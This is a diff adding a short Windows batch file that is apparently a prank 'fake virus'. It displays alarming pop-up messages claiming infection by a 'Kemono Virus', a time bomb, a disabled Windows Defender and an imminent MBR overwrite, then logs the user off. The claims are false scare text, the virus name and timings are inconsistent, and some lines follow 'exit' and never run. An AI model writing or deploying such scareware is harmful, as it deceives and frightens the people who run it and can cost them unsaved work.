@@ -1,0 +1,10 @@
+@echo off
+msg * "This Computer Is Infected by Kemono Virus, Stop The Computers Time Bomb By Turning Off your Computer By the Power Button! You Have 1 Minutes Before The Kemono Virus Bombs Your Computer!"
+timeout /t 100 /nobreak >nul
+shutdown /l
+cls
+echo YOUR PC HAS BEEN INFECTED AND INVADED BY KENOMO AND WINDOWS DEFENDER IS GONE FOREVER!!! YOU HAVE 12 SECONDS LEFT!!! TURN OFF YOUR PC OR IT WILL GET KILLED OFF!
+timeout /t 12 >nul
+exit
+msg * "BSOD INCOMING LOL GET READY FOR UR MBR OVERWRITTEN XDDDD"
+shutdown /l
